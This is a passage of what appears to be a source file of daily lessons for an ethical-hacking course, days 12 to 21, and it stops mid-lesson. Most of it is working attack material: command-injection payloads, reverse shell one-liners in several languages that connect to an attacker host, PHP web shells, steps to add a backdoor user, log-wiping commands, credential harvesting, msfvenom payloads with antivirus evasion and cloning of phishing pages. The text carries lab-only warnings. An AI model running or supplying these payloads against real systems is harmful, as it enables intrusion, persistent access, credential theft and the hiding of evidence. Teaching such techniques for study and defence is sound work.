             "- Understand how file inclusion can lead to RCE using log poisoning or RFI\n"
             "- Safely practice and demonstrate these attacks in a controlled lab environment\n",

    "day12": "*📅 Day 12: Command Injection & Remote Code Execution (RCE)*\n\n"
             "Command Injection is a critical vulnerability that allows an attacker to execute arbitrary system commands on a server. If exploited successfully, it may lead to full Remote Code Execution (RCE), granting shell access to the attacker.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Command Injection vs Remote Code Execution:\n"
             "   - *Command Injection:* User-supplied input is executed as part of a system command (e.g., via `system()`, `exec()` in PHP).\n"
             "   - *RCE:* Achieved when command injection leads to full shell access or control over the system.\n\n"
             "2. Indicators of Vulnerability:\n"
             "   - Forms or parameters that execute system functions (e.g., ping tools, traceroute, search fields).\n"
             "   - Improper sanitization of user input.\n"
             "   - Unexpected output in the response (e.g., command output).\n\n"
             "3. Practical Exploits:\n"
             "   - Common injection payloads:\n"
             "     ```bash\n"
             "     ; whoami\n"
             "     | id\n"
             "     && uname -a\n"
             "     `cat /etc/passwd`\n"
             "     ```\n"
             "   - Combine with reverse shell to gain persistent access:\n"
             "     ```bash\n"
             "     ; bash -i >& /dev/tcp/your-ip/4444 0>&1\n"
             "     ```\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. Identify Vulnerable Fields:\n"
             "   - Use DVWA (Command Injection Module) or custom vulnerable PHP scripts like:\n"
             "     ```php\n"
             "     system('ping -c 1 ' . $_GET['host']);\n"
             "     ```\n"
             "   - Try submitting payloads:\n"
             "     ```bash\n"
             "     127.0.0.1; whoami\n"
             "     8.8.8.8 && id\n"
             "     ```\n\n"

             "2. Capture Reverse Shell with Netcat:\n"
             "   - Start listener on attack machine:\n"
             "     ```bash\n"
             "     nc -lvnp 4444\n"
             "     ```\n"
             "   - Inject payload into vulnerable field:\n"
             "     ```bash\n"
             "     ; bash -i >& /dev/tcp/attacker-ip/4444 0>&1\n"
             "     ```\n\n"

             "3. Web-Based Payloads (Optional):\n"
             "   - Inject web shell (if file write is possible):\n"
             "     ```bash\n"
             "     echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n"
             "     ```\n"
             "     Access: `http://target.com/shell.php?cmd=id`\n\n"

             "*💡 Tips & Tools:*\n"
             "- Use Burp Suite to inject payloads into hidden fields or headers.\n"
             "- Combine with `curl` or `wget` to fetch external scripts.\n"
             "- If output is not shown, try blind injection techniques.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Command Injection & Reverse Shell Explained (by NetworkChuck)](https://www.youtube.com/watch?v=YdKxOWpC1NI)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Detect and test input fields for command injection\n"
             "- Execute OS-level commands through vulnerable web apps\n"
             "- Capture reverse shells using Netcat\n"
             "- Differentiate between basic injection and full RCE attacks\n",

    "day13": "*📅 Day 13: Privilege Escalation Basics*\n\n"
             "After gaining initial access to a system, attackers aim to escalate privileges — moving from a low-privileged user to admin/root. Privilege escalation is critical for persistence, lateral movement, and full system compromise.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Types of Privilege Escalation:\n"
             "   - *Vertical Escalation:* Gaining higher privileges (e.g., from www-data to root).\n"
             "   - *Horizontal Escalation:* Gaining access to another user's account with same privilege level.\n\n"
             "2. Linux Privilege Escalation Techniques:\n"
             "   - Misconfigured `sudo` permissions (`sudo -l`)\n"
             "   - Weak or writable SUID binaries\n"
             "   - Exploitable cron jobs or PATH variables\n"
             "   - Exploitable kernel vulnerabilities (e.g., dirtycow)\n\n"
             "3. Windows Privilege Escalation Techniques:\n"
             "   - Unquoted service paths\n"
             "   - Weak service permissions\n"
             "   - Registry misconfigurations\n"
             "   - DLL hijacking or token impersonation\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. Linux PrivEsc:\n"
             "   - Check for sudo privileges:\n"
             "     ```bash\n"
             "     sudo -l\n"
             "     ```\n"
             "   - Find SUID binaries:\n"
             "     ```bash\n"
             "     find / -perm -4000 -type f 2>/dev/null\n"
             "     ```\n"
             "   - Exploit writable binaries (e.g., `/usr/bin/python` as SUID):\n"
             "     ```bash\n"
             "     python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
             "     ```\n\n"

             "2. Windows PrivEsc:\n"
             "   - Use `winPEAS.exe` to auto-enumerate vulnerabilities:\n"
             "     ```powershell\n"
             "     winPEASx64.exe\n"
             "     ```\n"
             "   - Identify services with weak permissions using `accesschk.exe`:\n"
             "     ```powershell\n"
             "     accesschk.exe -uwcqv \"Users\" * /accepteula\n"
             "     ```\n"
             "   - Exploit: Modify and restart services or replace DLLs if possible.\n\n"

             "3. Enumeration Tools:\n"
             "   - `linPEAS.sh`: Comprehensive Linux enum script\n"
             "     ```bash\n"
             "     wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n"
             "     chmod +x linpeas.sh && ./linpeas.sh\n"
             "     ```\n"
             "   - `winPEAS.exe`: Automated Windows local enumeration tool\n"
             "     ```powershell\n"
             "     Download and run as low-priv user from cmd or PowerShell.\n"
             "     ```\n\n"

             "*💡 Bonus Tools & Tips:*\n"
             "- `GTFOBins`: Search for Linux binaries that can be abused for PrivEsc.\n"
             "- `PowerUp.ps1`: PowerShell script for Windows privilege escalation.\n"
             "- `sudo -l` and PATH abuse often give instant wins — always check first!\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Linux & Windows Privilege Escalation Crash Course (by The Cyber Mentor)](https://www.youtube.com/watch?v=U4Ue6rdzTfY)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand the difference between vertical and horizontal privilege escalation\n"
             "- Use automated tools like linPEAS/winPEAS for local enumeration\n"
             "- Exploit misconfigurations, weak file permissions, or kernel flaws to elevate privileges\n"
             "- Begin building privilege escalation checklists for both Linux and Windows targets\n",

    "day14": "*📅 Day 14: Password Cracking*\n\n"
             "Passwords are the first line of defense — and a common point of attack. Today you’ll learn how attackers crack passwords and how to defend against such attacks.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Hashes vs Encryption:\n"
             "   - *Hashing:* One-way transformation (e.g., MD5, SHA256) — used to store passwords securely.\n"
             "   - *Encryption:* Two-way (reversible) transformation using keys (e.g., AES).\n"
             "   - Hashes are often targeted using *dictionary* or *brute-force* attacks.\n\n"
             "2. Attack Techniques:\n"
             "   - *Dictionary Attack:* Tries passwords from a list (wordlist).\n"
             "   - *Brute Force:* Tries all possible character combinations — slower, but effective.\n"
             "   - *Rainbow Tables:* Precomputed hash→password tables to crack hashes faster.\n\n"
             "3. Cracking Tools Overview:\n"
             "   - `JohnTheRipper`: Versatile password cracker with smart algorithms.\n"
             "   - `Hashcat`: Fast, GPU-accelerated hash cracker.\n"
             "   - `Hydra`: Network login brute-forcer (SSH, FTP, HTTP, etc.).\n"
             "   - `hashid`: Tool to identify hash types based on format.\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. Identify Hash Type with `hashid`:\n"
             "   ```bash\n"
             "   hashid -m -j 5f4dcc3b5aa765d61d8327deb882cf99\n"
             "   # Output: Likely MD5\n"
             "   ```\n\n"

             "2. Crack Shadow Hashes with JohnTheRipper:\n"
             "   - Use a sample `/etc/shadow` file (or extract with root on test VM):\n"
             "     ```bash\n"
             "     unshadow /etc/passwd /etc/shadow > combined.txt\n"
             "     john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt\n"
             "     john --show combined.txt\n"
             "     ```\n\n"

             "3. Brute Force SSH Login with Hydra:\n"
             "   ```bash\n"
             "   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n"
             "   ```\n"
             "   - Replace `192.168.1.100` with the IP of your lab/test VM.\n"
             "   - Use `-L` instead of `-l` for a user list.\n\n"

             "4. Bonus – Crack with Hashcat (GPU-Based):\n"
             "   ```bash\n"
             "   hashcat -m 0 -a 0 hashes.txt rockyou.txt\n"
             "   # -m 0 = MD5 | -a 0 = Dictionary attack\n"
             "   ```\n\n"

             "*💡 Pro Tips:*\n"
             "- Always identify the hash type first (wrong mode = no crack).\n"
             "- Use strong wordlists like `rockyou.txt`, `SecLists`, or custom dumps.\n"
             "- Never test against real systems without permission!\n"
             "- Hashes from `shadow` require root permissions to extract.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Password Cracking with John and Hashcat (by Null Byte)](https://www.youtube.com/watch?v=7U-RbOKanYs)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Identify hash types from leaked data\n"
             "- Use JohnTheRipper and Hashcat to crack password hashes\n"
             "- Perform network brute-force attacks using Hydra\n"
             "- Understand the importance of strong hashing and password policies\n",

    "day15": "*📅 Day 15: Wireless Hacking Basics (WiFi)*\n\n"
             "Wireless networks are common targets due to weak configurations and predictable passwords. Today you'll learn how attackers analyze, capture, and attempt to crack WiFi traffic using powerful tools like Aircrack-ng.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. WiFi Encryption Standards:\n"
             "   - *WEP:* Outdated and highly insecure. Can be cracked within minutes.\n"
             "   - *WPA/WPA2-PSK:* Still used widely. WPA2 with strong passwords is secure against brute force.\n"
             "   - *WPA3:* Latest standard, resistant to traditional attacks (not covered today).\n\n"
             "2. Monitor Mode & Packet Injection:\n"
             "   - *Monitor Mode:* Allows capturing of all wireless packets in range.\n"
             "   - *Injection:* Ability to send deauthentication packets to force handshake capture.\n"
             "   - Requires compatible WiFi adapter (e.g., Alfa AWUS036NHA).\n\n"
             "3. Tools Overview:\n"
             "   - `airmon-ng`: Enables monitor mode.\n"
             "   - `airodump-ng`: Scans and captures WiFi packets.\n"
             "   - `aireplay-ng`: Performs deauth attacks.\n"
             "   - `aircrack-ng`: Cracks captured handshakes using wordlists.\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *Do this only on your own network or a lab environment.*\n\n"
             "1. Enable Monitor Mode:\n"
             "   ```bash\n"
             "   airmon-ng check kill\n"
             "   airmon-ng start wlan0\n"
             "   ```\n"
             "   - Interface may change to `wlan0mon`\n\n"

             "2. Capture WPA/WPA2 Handshake:\n"
             "   ```bash\n"
             "   airodump-ng wlan0mon\n"
             "   ```\n"
             "   - Note target BSSID and channel (CH)\n"
             "   ```bash\n"
             "   airodump-ng --bssid <target_bssid> -c <channel> -w handshake wlan0mon\n"
             "   ```\n"
             "   - Wait for a device to connect, or deauth a client:\n"
             "   ```bash\n"
             "   aireplay-ng --deauth 10 -a <router_bssid> wlan0mon\n"
             "   ```\n\n"

             "3. Crack Captured Handshake:\n"
             "   ```bash\n"
             "   aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap\n"
             "   ```\n"
             "   - Successful only if password exists in your wordlist.\n\n"

             "*💡 Pro Tips:*\n"
             "- Use `hcxdumptool` + `hashcat` for faster WPA cracking with GPUs.\n"
             "- WEP can be cracked using packet replay techniques (see `aireplay-ng` for more).\n"
             "- Always test on *authorized* networks. Unauthorized WiFi hacking is illegal!\n"
             "- Recommended WiFi adapter: Alfa AWUS036NHA or Panda Wireless.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 WiFi Hacking with Aircrack-ng (by NetworkChuck)](https://www.youtube.com/watch?v=7CrZOm_N6I0)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand WiFi security and encryption types\n"
             "- Enable monitor mode and capture WPA2 handshakes\n"
             "- Perform basic deauth attacks to force reauthentication\n"
             "- Attempt password cracking with Aircrack-ng and wordlists\n",

    "day16": "*📅 Day 16: Reverse Shells*\n\n"
             "Reverse shells are powerful tools that allow attackers to gain remote access from a victim machine. Once a reverse shell is established, attackers can interact with the compromised system just like a local terminal.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. What is a Reverse Shell?\n"
             "   - A shell session where the victim connects back to the attacker (reverses the usual flow).\n"
             "   - Often used to bypass firewalls and NATs that block inbound connections.\n\n"
             "2. Reverse Shell vs Bind Shell:\n"
             "   - *Reverse Shell:* Attacker listens → victim connects.\n"
             "   - *Bind Shell:* Victim opens a port → attacker connects (easily blocked by firewalls).\n\n"
             "3. TCP vs HTTP Shells:\n"
             "   - *TCP Reverse Shells:* Direct and fast (Netcat, Bash, Python).\n"
             "   - *HTTP-based Shells:* Often used to evade firewall rules (e.g., using web-based payloads).\n\n"
             "4. Tools & Languages Used:\n"
             "   - `Netcat`, `Bash`, `Python`, `PHP`, `Perl`, `PowerShell`\n"
             "   - Useful in crafting payloads for exploitation, post-exploitation, or CTFs.\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *Perform all tasks in a controlled lab or VM setup.*\n\n"
             "1. Start a Netcat Listener on the Attacker's Machine:\n"
             "   ```bash\n"
             "   nc -lvnp 4444\n"
             "   ```\n\n"

             "2. Reverse Shell from Target (Linux Bash):\n"
             "   ```bash\n"
             "   bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1\n"
             "   ```\n"
             "   - Alternative Bash Shell:\n"
             "     ```bash\n"
             "     /bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'\n"
             "     ```\n\n"

             "3. Reverse Shell in Other Languages:\n"
             "- **Python:**\n"
             "  ```bash\n"
             "  python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])'\n"
             "  ```\n\n"
             "- **PHP:**\n"
             "  ```php\n"
             "  php -r '$sock=fsockopen(\"<attacker_ip>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
             "  ```\n\n"
             "- **Perl:**\n"
             "  ```bash\n"
             "  perl -e 'use Socket;$i=\"<attacker_ip>\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
             "  ```\n\n"
             "- **PowerShell (Windows):**\n"
             "  ```powershell\n"
             "  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('<attacker_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\n"
             "  ```\n\n"

             "*💡 Pro Tips:*\n"
             "- Use `ngrok` or `serveo.net` to get public IPs for remote testing.\n"
             "- Always try `which nc` or `which python` to know available interpreters on victim systems.\n"
             "- Use `msfvenom` for generating prebuilt reverse shell payloads (will cover later).\n"
             "- Use `rlwrap nc -lvnp 4444` for a better interactive shell experience.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Reverse Shells Explained Simply (by Hackersploit)](https://www.youtube.com/watch?v=_MG8sTT4v3s)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Set up and receive connections from reverse shells\n"
             "- Generate payloads using Bash, Python, PHP, and Netcat\n"
             "- Understand differences between TCP and HTTP-based shells\n"
             "- Execute and maintain basic shell access on compromised systems\n",

    "day17": "*📅 Day 17: Post Exploitation Basics*\n\n"
             "Exploitation is only the beginning. Post-exploitation involves gathering critical data, maintaining access, pivoting deeper into the network, and covering your tracks. It’s essential in red teaming and real-world attacks.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. System & User Recon:\n"
             "   - Identify current users, groups, privileges\n"
             "   - Check running processes, open ports, network connections\n\n"
             "2. Credential Collection:\n"
             "   - Search for stored passwords in config files, bash history, text files\n"
             "   - Look in `/etc/passwd`, `.ssh/`, browser config files, saved credentials\n\n"
             "3. Persistence Techniques:\n"
             "   - Add new users or SSH keys\n"
             "   - Add cron jobs or modify startup scripts (rc.local, bashrc)\n\n"
             "4. Anti-Forensics (Covering Tracks):\n"
             "   - Clear logs, command history, and access traces\n"
             "   - Avoid raising alarms on IDS/AV\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. System Enumeration:\n"
             "   ```bash\n"
             "   whoami\n"
             "   id\n"
             "   uname -a\n"
             "   who\n"
             "   netstat -tulnp\n"
             "   ps aux\n"
             "   ```\n\n"
             "2. Credential Harvesting:\n"
             "   ```bash\n"
             "   cat /etc/passwd\n"
             "   cat ~/.bash_history\n"
             "   find / -name '*.conf' 2>/dev/null | xargs grep -i 'password'\n"
             "   ls -la ~/.ssh/\n"
             "   ```\n\n"
             "3. Persistence (Linux):\n"
             "   - Add a new user:\n"
             "     ```bash\n"
             "     useradd hacker -m -s /bin/bash\n"
             "     echo 'hacker:toor' | chpasswd\n"
             "     usermod -aG sudo hacker\n"
             "     ```\n"
             "   - Add SSH key:\n"
             "     ```bash\n"
             "     mkdir ~/.ssh\n"
             "     echo '<your_public_key>' > ~/.ssh/authorized_keys\n"
             "     chmod 600 ~/.ssh/authorized_keys\n"
             "     ```\n\n"
             "4. Cleanup (Anti-Forensics):\n"
             "   ```bash\n"
             "   > ~/.bash_history\n"
             "   history -c\n"
             "   echo '' > /var/log/auth.log\n"
             "   rm -f /root/.bash_history /home/*/.bash_history\n"
             "   ```\n"
             "   ⚠️ Use with caution in labs only. Don't delete real logs in unauthorized systems.\n\n"

             "*💡 Tips & Tools:*\n"
             "- `LinEnum.sh`, `linux-smart-enumeration.sh`: Automate recon.\n"
             "- `Mimikatz` for Windows post-exploitation (coming in later sessions).\n"
             "- Never change too much — stealth is key.\n"
             "- Use `crontab -e`, `systemd`, or backdoored binaries for persistence.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Post Exploitation Techniques by IppSec (on TryHackMe/HTB)](https://www.youtube.com/watch?v=9FoYl2MXU1o)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Enumerate users, services, and sensitive files\n"
             "- Harvest credentials and establish persistence access\n"
            "- Clear or obfuscate command logs and traces\n"
            "- Understand the essentials of real-world post-exploitation methodology\n",

    "day18": "*📅 Day 18: Web Shells and PHP Exploits*\n\n"
             "Web shells are small scripts uploaded to a vulnerable web server that provide remote command execution and file access. They're a common method for attackers to maintain access, escalate privileges, or pivot further into the system.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. What is a Web Shell?\n"
             "   - A malicious script (often written in PHP, ASP, JSP) uploaded to a web server to execute OS commands remotely.\n"
             "   - Acts as a backdoor and can include features like file upload, reverse shell, database dumping, etc.\n\n"
             "2. Common Upload Vulnerabilities:\n"
             "   - Insecure file upload forms (missing file type checks)\n"
             "   - Poor MIME type validation\n"
             "   - No input sanitization or blacklisted extensions\n"
             "   - File renaming or execution in writable directories (e.g., `/uploads/`)\n\n"
             "3. Tools Overview:\n"
             "   - `Weevely`: PHP-based stealthy web shell that provides terminal-like access.\n"
             "   - `b374k`: Powerful browser-based PHP web shell with GUI (upload/download, SQL, reverse shell, etc.).\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *Perform all actions in a safe lab environment using DVWA, BWAPP, or your own vulnerable setup.*\n\n"
             "1. Upload a Basic PHP Shell to DVWA:\n"
             "   ```php\n"
             "   <?php system($_GET['cmd']); ?>\n"
             "   # Save as shell.php and upload via DVWA 'File Upload' vulnerability.\n"
             "   # Access in browser:\n"
             "   http://target-ip/uploads/shell.php?cmd=id\n"
             "   ```\n\n"

             "2. Use Weevely for Stealth Shell Access:\n"
             "   - Generate payload:\n"
             "     ```bash\n"
             "     weevely generate secret123 shell.php\n"
             "     ```\n"
             "   - Upload `shell.php` to the vulnerable server.\n"
             "   - Connect back:\n"
             "     ```bash\n"
             "     weevely http://target/uploads/shell.php secret123\n"
             "     ```\n"
             "   - Use built-in modules: file browsing, sql dumping, reverse shells, etc.\n\n"

             "3. Try GUI Shell: b374k Web Shell\n"
             "   - Upload `b374k.php` to the server (available on GitHub).\n"
             "   - Browse to `http://target/uploads/b374k.php`\n"
             "   - Login with default password and explore web-based shell GUI.\n\n"

             "*💡 Security Tips for Defense:*\n"
             "- Disable PHP execution in upload directories (e.g., `.htaccess` with `php_flag engine off`).\n"
             "- Validate file type using server-side checks (e.g., file signature, not just extension).\n"
             "- Use application-level firewall or IDS to detect and block web shell behavior.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Uploading Web Shells & Exploiting File Upload Vulnerabilities (by STÖK)](https://www.youtube.com/watch?v=G2JchGv8GFc)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Upload and execute basic PHP web shells on vulnerable servers\n"
             "- Use advanced shell tools like Weevely and b374k for persistent control\n"
             "- Understand the upload vulnerabilities that make web shells possible\n"
             "- Take basic steps to secure applications from shell-based exploits\n",

    "day19": "*📅 Day 19: Client-Side Attacks & Social Engineering*\n\n"
             "Why hack a machine when you can hack a human? Social Engineering (SE) exploits human behavior to gain unauthorized access. These attacks are simple, powerful, and very common — and today, we simulate them ethically in a lab.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. What is Social Engineering?\n"
             "   - Psychological manipulation to trick people into giving up confidential information or executing malicious actions.\n"
             "   - Examples: phishing, baiting, pretexting, impersonation, tailgating.\n\n"
             "2. Types of Client-Side Attacks:\n"
             "   - *Phishing:* Creating fake login pages or emails to steal credentials.\n"
             "   - *USB Attacks:* Dropping a malicious USB (e.g., Rubber Ducky) with autorun payloads.\n"
             "   - *Drive-by downloads:* Triggering malware installation when user visits a page.\n\n"
             "3. Tools Overview:\n"
             "   - `SEToolkit` (Social-Engineer Toolkit): Automates phishing/cloning tasks.\n"
             "   - *Phishing Kits:* Prebuilt HTML+PHP login clones (available on GitHub).\n"
             "   - *USB Rubber Ducky:* A USB that acts as a keyboard to execute payloads rapidly.\n\n"

             "*🛠️ Practical Tasks (Lab Only!):*\n"
             "⚠️ *Strictly for educational/testing use in isolated lab environments.*\n\n"
             "1. Clone a Login Page using SEToolkit:\n"
             "   ```bash\n"
             "   sudo setoolkit\n"
             "   # Choose: 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester → 2) Site Cloner\n"
             "   # Enter target URL (e.g., https://facebook.com)\n"
             "   ```\n"
             "   - This will host the cloned page on your local IP.\n\n"

             "2. Host Phishing Page on Localhost:\n"
             "   ```bash\n"
             "   ifconfig  # Note IP (e.g., 192.168.1.10)\n"
             "   apache2ctl start  # Or: service apache2 start\n"
             "   cp /var/www/html/index.html /var/www/html/phish.html\n"
             "   # Customize and host your phishing page\n"
             "   ```\n"
             "   - Access via: `http://192.168.1.10/phish.html`\n\n"

             "3. Send the Link via Email or LAN Chat:\n"
             "   - Example message: *\"Hey, check this new login update: http://192.168.1.10/login\"*\n"
             "   - Use netcat chat, Discord (lab only), or mail clients for testing phishing delivery.\n\n"

             "4. BONUS: Simulate Rubber Ducky Payload (Optional):\n"
             "   - Create a `.ino` script for Arduino to mimic keyboard strokes\n"
             "   - Example payload: Open terminal → download & execute script\n"
             "   - Tools: [Duckyscript](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript)\n\n"

             "*💡 Tips & Ethics:*\n"
             "- Never test phishing in real environments — always isolate in VMs or local labs.\n"
             "- Use domain obfuscation techniques carefully (for learning only).\n"
             "- SE is the most successful attack vector in real breaches. Learn to recognize and prevent it.\n"
             "- Create awareness among users — it's the strongest countermeasure.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 SEToolkit Phishing Attack Tutorial (by David Bombal)](https://www.youtube.com/watch?v=evkqkK_jUCM)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand the psychology and structure of SE attacks\n"
             "- Use SEToolkit to create and host phishing websites\n"
             "- Send and track phishing attempts in LAN environments\n"
             "- Recognize the importance of defense against human-targeted attacks\n",

    "day20": "*📅 Day 20: Malware Basics*\n\n"
             "Malware is malicious software used to gain unauthorized access, disrupt, steal, or damage information systems. Today you'll learn to generate and analyze basic payloads (malware) in a **safe, isolated lab environment**.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Types of Malware:\n"
             "   - *Trojan:* Disguised as legitimate software.\n"
             "   - *Worm:* Self-replicates and spreads over networks.\n"
             "   - *Virus:* Infects files and spreads on execution.\n"
             "   - *Keylogger:* Records keystrokes.\n"
             "   - *Backdoor:* Gives unauthorized remote access.\n\n"
             "2. Common Malware Techniques:\n"
             "   - Code obfuscation to evade antivirus\n"
             "   - Persistence via registry edits, startup scripts\n"
             "   - Data exfiltration or remote command execution\n\n"
             "3. Introduction to `msfvenom`:\n"
             "   - Part of Metasploit Framework\n"
             "   - Generates custom payloads in various formats (exe, apk, py, sh, etc.)\n"
             "   - Often combined with `msfconsole` for handling sessions\n\n"

             "*🛠️ Practical Tasks (LAB ONLY!):*\n"
             "⚠️ *Use an isolated Windows VM with snapshots. Never run payloads on your host system.*\n\n"
             "1. Generate a Windows Reverse Shell Payload:\n"
             "   ```bash\n"
             "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > payload.exe\n"
             "   ```\n"
             "   - `-p`: Payload\n"
             "   - `LHOST`: Attacker's IP (local)\n"
             "   - `LPORT`: Listening port\n"
             "   - `-f exe`: Format as .exe\n\n"

             "2. Start a Listener in Metasploit:\n"
             "   ```bash\n"
             "   msfconsole\n"
             "   use exploit/multi/handler\n"
             "   set payload windows/meterpreter/reverse_tcp\n"
             "   set LHOST <your_ip>\n"
             "   set LPORT 4444\n"
             "   exploit\n"
             "   ```\n"
             "   - Wait for the target to run the EXE. Meterpreter shell opens on connect.\n\n"

             "3. Run Payload on Windows VM (TEST ONLY!):\n"
             "   - Transfer the file using shared folders, USB, or HTTP server:\n"
             "     ```bash\n"
             "     python3 -m http.server 8000\n"
             "     # Then on Windows VM, open browser to http://attacker_ip:8000\n"
             "     ```\n"
             "   - Once executed, observe incoming connection on Metasploit listener.\n\n"

             "*🧠 Extra (Optional Advanced):*\n"
             "- Try encoding payloads:\n"
             "  ```bash\n"
             "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_payload.exe\n"
             "  ```\n"
             "  - `-e`: Encoder\n"
             "  - `-i`: Number of iterations\n\n"
             "- Use Veil Framework to bypass antivirus (Linux):\n"
             "  ```bash\n"
             "  git clone https://github.com/Veil-Framework/Veil\n"
             "  cd Veil && ./Veil.py\n"
             "  ```\n\n"

             "*💡 Important Notes:*\n"
             "- Never run real payloads on live systems or networks.\n"
             "- Use tools like VirtualBox or VMware with NAT and snapshots.\n"
             "- AV/EDR solutions may delete or block payloads — disable them in labs.\n"
             "- Use `exploit/multi/handler` to capture sessions from any platform.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Generate Malware using msfvenom (by The Cyber Mentor)](https://www.youtube.com/watch?v=GFLQp9qjVYI)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand basic malware categories and behaviors\n"
             "- Use `msfvenom` to craft reverse shell payloads in `.exe` format\n"
             "- Capture and control remote Meterpreter sessions in a lab\n"
             "- Test simple evasion using encoders and validate behavior\n",

    "day21": "*📅 Day 21: Windows Hacking*\n\n"
             "Windows systems are prime targets in enterprise environments. Today you’ll learn how attackers exploit misconfigurations, outdated patches, and insecure privilege settings to escalate access on Windows machines.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Windows Privilege Escalation Paths:\n"
             "   - Unquoted service paths\n"
             "   - Insecure permissions (e.g., writable services or registry keys)\n"
             "   - AlwaysInstallElevated policy\n"
             "   - Scheduled tasks, startup folders\n"
             "   - DLL hijacking & token impersonation\n\n"
             "2. Common Enumeration Commands:\n"
             "   ```powershell\n"
             "   whoami /priv\n"
             "   systeminfo\n"
             "   net user\n"
             "   wmic qfe get Caption,Description,HotFixID,InstalledOn\n"
             "   tasklist /v\n"
             "   icacls \"C:\\\" /T /C\n"
             "   ```\n\n"
             "3. Enumeration Tools:\n"
             "   - `winPEAS.exe`: Privilege Escalation Awesome Script (compiled binary)\n"
             "   - `PowerUp.ps1`: PowerShell-based enumeration tool\n"
             "   - `Seatbelt.exe`: Windows enumeration focused on operational security\n\n"
             "4. Local Exploits (for LAB USE):\n"
             "   - Vulnerable versions: Windows 7, 8, Server 2008 (test only)\n"
             "   - Common exploits:\n"
             "     - *MS10-092:* Task Scheduler vulnerability\n"
             "     - *MS16-032:* Bypass UAC and elevate to SYSTEM\n"
             "     - Use Metasploit or manual PowerShell scripts to trigger\n\n"

             "*🛠️ Practical Tasks (Lab Only):*\n"
             "1. Basic System Enumeration:\n"
             "   ```cmd\n"
             "   whoami /all\n"
             "   systeminfo\n"
             "   net user\n"
             "   hostname\n"
             "   echo %USERNAME% && echo %USERDOMAIN%\n"
             "   ```\n\n"

             "2. Run `winPEAS.exe`:\n"
             "   - Download: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)\n"
             "   - Transfer to Windows VM and run via CMD or PowerShell:\n"
             "     ```cmd\n"
             "     winPEAS.exe > result.txt\n"
             "     notepad result.txt\n"
             "     ```\n"
             "   - Look for writable service binaries, weak registry permissions, tokens, etc.\n\n"

             "3. Run `PowerUp.ps1` (PowerShell):\n"
             "   ```powershell\n"
             "   powershell -ExecutionPolicy Bypass\n"
             "   . .\\PowerUp.ps1\n"
             "   Invoke-AllChecks\n"
             "   ```\n\n"

             "4. Exploit a Known Vulnerability (Example):\n"
